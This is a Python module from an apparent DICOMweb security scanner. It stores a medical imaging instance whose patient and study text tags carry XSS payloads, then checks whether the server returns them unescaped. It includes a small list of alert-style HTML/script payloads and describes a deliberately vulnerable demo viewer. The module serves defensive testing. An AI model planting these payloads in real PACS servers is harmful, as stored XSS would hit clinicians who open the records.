"""Stored-XSS-in-metadata check for DICOMweb.

DICOM free-text tags (PatientName, StudyDescription, InstitutionName, ...) are
operator-supplied strings.  Web-based viewers (OHIF, Weasis-web, cloud viewers,
PACS admin UIs) render them into the DOM.  If the server stores a tag verbatim
and a viewer injects it as HTML rather than text, an instance STOW-RS'd with a
scripted PatientName becomes **stored XSS** against everyone who later opens it.

wadoscope checks the *server-side necessary condition*: it stores a poisoned
instance, retrieves the metadata back over WADO-RS, and reports which tags come
back with the payload **unsanitised**.  It cannot see a specific viewer's DOM,
so a positive is "stored unescaped — XSS-prone in an HTML-rendering viewer", not
"proven execution".  ``docker/xss_viewer.html`` is a deliberately-vulnerable
mini-viewer that turns a positive into a live pop for a demo.

The round-trip scanner (`scan_metadata_for_payload`) is a pure function and is
unit-tested without a server.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional

from ..web.client import DicomWebClient
from ..web import wado
from ..web.inject import INJECTABLE_TAGS, build_instance, build_multipart

# DICOM+JSON keys for the injectable keywords.
TAG_HEX: dict[str, str] = {
    "PatientName":            "00100010",
    "ReferringPhysicianName": "00080090",
    "StudyDescription":       "00081030",
    "SeriesDescription":      "0008103E",
    "InstitutionName":        "00080080",
    "PatientComments":        "00104000",
}

# A short, VR-length-safe payload set.  The default survives most length limits
# (LO/PN cap at 64) and fires via an image-load handler rather than <script>,
# which many front-ends strip but fewer attribute-encode.
DEFAULT_PAYLOAD = "<img src=x onerror=alert(document.domain)>"
PAYLOADS = [
    DEFAULT_PAYLOAD,
    "<script>alert(document.domain)</script>",
    '"><svg onload=alert(document.domain)>',
]


@dataclass
class XssFinding:
    tag: str
    stored: bool = False
    unescaped: bool = False
    returned: str = ""
    severity: str = "info"
    detail: str = ""


def _html_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             .replace('"', "&quot;").replace("'", "&#x27;"))


def _stored_value(obj: dict, hextag: str) -> Optional[str]:
    """Pull the first value of *hextag* from one DICOM+JSON object, or None."""
    node = obj.get(hextag)
    if not node:
        return None
    values = node.get("Value")
    if not values:
        return None
    v = values[0]
    if isinstance(v, dict):                 # Person Name -> {"Alphabetic": ...}
        v = v.get("Alphabetic", "")
    return str(v)


def scan_metadata_for_payload(metadata: list[dict], payload: str,
                              tags: Optional[list[str]] = None) -> list[XssFinding]:
    """Decide, per tag, whether *payload* survived unsanitised in *metadata*.

    Pure function: *metadata* is the DICOM+JSON array as returned by WADO-RS /
    QIDO-RS.  A tag absent from the metadata is skipped (no finding).
    """
    tags = tags or list(TAG_HEX)
    encoded = _html_escape(payload)
    findings: list[XssFinding] = []

    for kw in tags:
        hextag = TAG_HEX.get(kw)
        if not hextag:
            continue
        value: Optional[str] = None
        for obj in metadata:
            v = _stored_value(obj, hextag)
            if v is not None:
                value = v
                break
        if value is None:
            continue

        f = XssFinding(tag=kw, returned=value)
        if payload in value:
            f.stored, f.unescaped, f.severity = True, True, "high"
            f.detail = ("stored verbatim — executes in a viewer that renders "
                        "this tag as HTML")
        elif encoded in value or "&lt;" in value:
            f.stored, f.severity = True, "info"
            f.detail = "stored but HTML-encoded by the server"
        else:
            f.detail = "payload not returned (stripped, truncated, or altered)"
        findings.append(f)
    return findings


@dataclass
class XssResult:
    study_uid: str = ""
    stow_status: int = 0
    findings: list[XssFinding] = field(default_factory=list)

    @property
    def vulnerable_tags(self) -> list[str]:
        return [f.tag for f in self.findings if f.unescaped]


def check_xss(client: DicomWebClient, payload: str = DEFAULT_PAYLOAD,
              tags: Optional[list[str]] = None) -> XssResult:
    """STOW a poisoned instance, read its metadata back, and scan for the payload.

    The STOW passes the client's safe-mode gate, so this only runs with
    ``--unsafe``.  Returns an :class:`XssResult`.
    """
    tags = tags or list(INJECTABLE_TAGS)
    tag_values = {kw: payload for kw in tags if kw in TAG_HEX}

    blob, study_uid = build_instance(tag_values)
    body, ctype = build_multipart([blob])
    stow = client.post_multipart("/studies", body, ctype)   # safe-mode gated

    meta: list[dict] = []
    if stow.status_code in (200, 202):
        meta = wado.retrieve_metadata(client, study_uid)

    findings = scan_metadata_for_payload(meta, payload, list(tag_values))
    return XssResult(study_uid=study_uid, stow_status=stow.status_code,
                     findings=findings)
